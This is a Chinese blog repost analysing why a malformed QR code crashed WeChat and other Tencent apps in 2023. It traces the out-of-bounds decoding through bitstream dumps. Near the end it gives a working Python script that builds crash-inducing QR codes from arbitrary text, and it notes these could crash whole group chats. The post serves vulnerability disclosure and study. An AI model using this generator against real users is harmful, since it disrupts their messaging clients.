---
title: The reason for the QR code crash
description: 扫码崩溃的原因，附源码分析
date: 2023-04-25T13:00:00.000+00:00
lang: zh
duration: 10min
plum: true
---

> 原文转自:[扫码崩溃的原因，附源码分析](https://mp.weixin.qq.com/s/JKDOTIvJqGVPLmXP3BK5rQ)

**近日**，网传微信识别上方二维码就会出现闪退BUG，我也也忍不住尝试了一下，果然，一识别该二维码微信立马就出现了闪退的现象；且会出现“微信运行异常，建议前往软件商店更新至最新版本”的提示。

随后，我又对该二维码进行了转发测试，亦是如此，将二维码转发给好友后微信又出现闪退情况；在手机微信中无需识别，仅仅是点击该二维码，微信就会出现闪退；

在微信电脑端，小编测试发现苹果电脑点击该二维码同样会出现闪退现象，但是 Windows 10 测试则正常无闪退。

目前该二维码除了导致闪退外未发现其他副作用。

对于此次闪退事件，有网友发文解释称：目前微信闪退崩溃是因为 OCR 识别系统出现了内存崩溃导致的，这个图片导致了微信内存泄漏，所以会闪退崩溃。闪退问题不会涉及个人隐私问题和封号和资金泄漏问题，目前该功能已经在加急加班的修复中。
![知情人士截图](https://i.328888.xyz/2023/04/25/ioT4Td.md.jpeg)

不过上述对于微信闪退的解释也只是网友观点，截止发稿，腾讯官方还未公开回应。前面有提到，由于这张二维码图片导致内存泄漏，进而引发微信闪退。而造成此问题的根源是 “微信二维码引擎”——它会自动识别聊天列表中的二维码

当用户打开聊天列表，微信二维码引擎识别到这张二维码的时候出现了空指针异常，导致二维码模块崩溃

最终 “祸及” 整个微信客户端

另外，不只是微信，其他腾讯系的软件如果使用了同样的二维码引擎，应该都有这个问题。参考此issue的反馈
[issue](https://github.com/opencv/opencv_contrib/issues/3478)
[![ioT2ep.md.png](https://i.328888.xyz/2023/04/25/ioT2ep.md.png)](https://imgloc.com/i/ioT2ep)

从公开的资料可知，该引擎已在 2021 年开源，并合并到了 OpenCV。
[开源地址](https://github.com/WeChatCV)
OpenCV 全称为 Open Source Computer Vision Library，是一个跨平台的开源计算机视觉和机器学习软件库，可用于开发实时的图像处理、计算机视觉以及模式识别程序。

根据开发者的分析，引发微信闪退的二维码属于 “畸形二维码”，这类二维码包含的错误数据块会导致微信二维码模块中的 libqbar.so 崩溃，进而引发软件闪退。

---

## 下面内容来自开发者的分析：

这是一张用微信扫描就会 crash 的二维码，应该是微信 OCR 的实现有问题，以及如果发在群聊里可能会导致群聊的人都闪退（因为微信会自动识别二维码）
UPDATE: 腾讯系的软件应该都有这个问题
感觉主要出锅的地方在：

```shell
[0100] [00000001] []
Mode Indicator : 8-bit Mode (0100)
Character Count Indicator : 1
Decoded data :
```

因为队友说似乎是 null deref，直接遍历解码到后期的时候发现了以下的问题，填充和 RS 在这样的扫描下直接被吃掉了：

```shell
{value: '00000001', type: 'Char. count indicator', decoded: 1, modules: Array(8)}
{value: '10011111', type: 'Message data', decoded: '\x9F', modules: Array(8)}
{value: '0000', type: 'Mode indicator', decoded: 'Terminator', modules: Array(4)}
{value: '0010', type: 'Mode indicator', decoded: 'Alphanumeric mode', modules: Array(4)}
{value: '100111001', type: 'Char. count indicator', decoded: 313, modules: Array(9)}
{value: '01100111100', type: 'Message data', decoded: 'II', modules: Array(11)}
{value: '01100010011', type: 'Message data', decoded: 'HM', modules: Array(11)}
{value: '10100001110', type: 'Message data', decoded: 'SY', modules: Array(11)}
{value: '00110010000', type: 'Message data', decoded: '8+', modules: Array(11)}
{value: '01110011111', type: 'Message data', decoded: 'KR', modules: Array(11)}
{value: '01101010111', type: 'Message data', decoded: 'J0', modules: Array(11)}
{value: '01110100010', type: 'Message data', decoded: 'KU', modules: Array(11)}
{value: '10000011011', type: 'Message data', decoded: 'NG', modules: Array(11)}
{value: '11101010111', type: 'Message data', decoded: '-Y', modules: Array(11)}
{value: '1101', type: 'Message data', decoded: '0D', modules: Array(4)}
{value: '', type: 'Message data', decoded: NaN, modules: Array(0)}
{value: '', type: 'Message data', decoded: NaN, modules: Array(0)}
```

提取出的数据来看，在到达最后一个 8-bit Mode 后是一个不可见字符 \x9f 和正常的终止符号，但在之后本应该是 padding 的 11101100 和 11101100 却不见了踪迹，后续的 block 恰好被解析为了 Alphanumeric mode，长度块标准为 9 bit，并且读取出其长度为 313，导致后续的数据被解析为了奇怪的内容，并且直接开始越界解析。

但是尝试复现并未成功构造一个可以被微信复现的二维码，并且 qrazybox 也被这样的长度标识欺骗了，但是在上面的例子里并没有，似乎整个问题比想象的复杂：

```shell
Final data bits :
00101111111110000101110100010001010001110011000010100000111011000001000111101100000100011110110000010001111011000001000111101100
[0010] [111111111] [0000101110100010001010001110011000010100000111011000001000111101100000100011110110000010001111011000001000111101100]
Mode Indicator : Alphanumeric Mode (0010)
Character Count Indicator : 511
Decoded data : 2333AA76%J5L1QVFA.380Cundefinedundefinedundefinedundefinedundefined……
Final Decoded string : 2333AA76%J5L1QVFA.380C
```

忽略了一个核心问题，这个二维码的数据区已经被完全填满（224 bit），解码器可能会因为遇到 padding pattern 而提前 break，打算再去构造一下。
构造成功了，成功让微信崩溃了！几个要点：

1. 数据需要绝对无填充，不可以出现 padding pattern
2. 最后一个 block 的记录长度要尽可能的长，与什么模式无关

理论上只要能够找到合适的 data block 组合，恰好填充满二维码的容量，并在最后一个 0 长 block 中写入一个越界的长度，并保证上述所有数据 RS 纠错码生成正确，就可以实现崩溃了。
附上复现用的代码，可根据任意文本内容构造畸形二维码：

```python
import qrcode
from qrcode.util import QRData, MODE_8BIT_BYTE

NUM_BLOCKS = [19, 34, 55, 80, 108, 136, 156, 194, 232]

def tencent_crash_qrcode(message: str, filename='crash.png'):

    def hack_put(self, num, length):
        if num == 0:
            num = 1
        for i in range(length):
            self.put_bit(((num >> (length - i - 1)) & 1) == 1)

    data = message.encode('utf-8')
    data_len = len(data)

    version = 1
    while version <= len(NUM_BLOCKS) and data_len + 3 > NUM_BLOCKS[version-1]:
        version += 1
    if version > len(NUM_BLOCKS):
        raise Exception('message too long')

    data += b' ' * (NUM_BLOCKS[version-1] - data_len - 3)

    print(data_len, version)
    qr = qrcode.QRCode(version, qrcode.constants.ERROR_CORRECT_L)

    comm_data = QRData(data, MODE_8BIT_BYTE)
    hack_data = QRData(b'', MODE_8BIT_BYTE)

    qr.add_data(comm_data, 0)
    qr.add_data(hack_data, 0)

    original_put = qrcode.util.BitBuffer.put
    qrcode.util.BitBuffer.put = hack_put
    qr.make_image().save(filename)
    qrcode.util.BitBuffer.put = original_put

tencent_crash_qrcode('KFCVW50')
```

**最后**，附上一个通过脚本生成的畸形二维码。
[![ioTjB3.th.png](https://i.328888.xyz/2023/04/25/ioTjB3.th.png)](https://imgloc.com/i/ioTjB3)
